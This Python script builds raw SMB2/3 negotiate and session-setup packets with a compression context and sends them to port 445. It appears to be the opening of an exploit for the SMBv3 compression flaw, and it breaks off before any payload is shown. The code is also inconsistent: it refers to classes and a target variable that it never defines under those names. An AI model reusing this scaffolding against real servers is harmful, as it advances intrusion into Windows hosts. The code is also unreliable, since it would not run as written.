import socket, struct, sys
import os, ctypes, threading

class SmbHeader:
    def __init__(self, command, message_id=0, session_id=0):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  # Must be set to 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = struct.pack('<H', command)
        self.credits_requested = b"\x00"*2  # Number of credits requested / granted
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  # Points to next message
        self.message_id = struct.pack('<Q', message_id)
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  # Changes for some commands
        self.session_id = struct.pack('<Q', session_id)
        self.signature = b"\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class SmbNegotiateRequest:
    def __init__(self):
        self.header = SmbHeader(0)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  # 8 dialects
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  # 2 Contexts
        self.reserved_2 = b"\x00"*2
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" + b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = b"\x00"*4

    def context(self, type, length):
        data_length = length
        reserved = b"\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  # 1 hash algorithm
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        #compression_algorithm_count = b"\x03\x00"  # 3 Compression algorithms
        compression_algorithm_count = b"\x01\x00"
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        #algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = b"\x01\x00"
        #length = b"\x0e\x00"
        length = b"\x0a\x00"
        context_header = self.context(b"\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = b"\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>i', len(data))[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2SessionSetupRequest:
    def __init__(self, message_id, buffer, session_id=0, padding=b''):
        self.header = Smb2Header(1, message_id, session_id)
        self.structure_size = b"\x19\x00"
        self.flags = b"\x00"
        self.security_mode = b"\x02"
        self.capabilities = b"\x00"*4
        self.channel = b"\x00"*4
        self.security_buffer_offset = struct.pack('<H', 0x58 + len(padding))
        self.security_buffer_length = struct.pack('<H', len(buffer))
        self.previous_session_id = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.padding = padding
        self.buffer = buffer

    def get_packet(self):
        return (self.header.get_packet() +
            self.structure_size +
            self.flags +
            self.security_mode +
            self.capabilities +
            self.channel +
            self.security_buffer_offset +
            self.security_buffer_length +
            self.previous_session_id +
            self.padding +
            self.buffer)

def send_negotiation(sock):
    negotiate = SmbNegotiateRequest().get_packet()
    packet = NetBIOSWrapper(negotiate).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def main():
  sock = socket.socket(socket.AF_INET)
  sock.settimeout(30)
  sock.connect((ip_address, 445))
  send_negotiation(sock)
  # Send a valid session setup packet, so that the connection won't be dropped.
  ntlm_negotiate = SmbNtlmNegotiate().get_packet()
  session_setup = SmbSessionSetupRequest(1, ntlm_negotiate).get_packet()
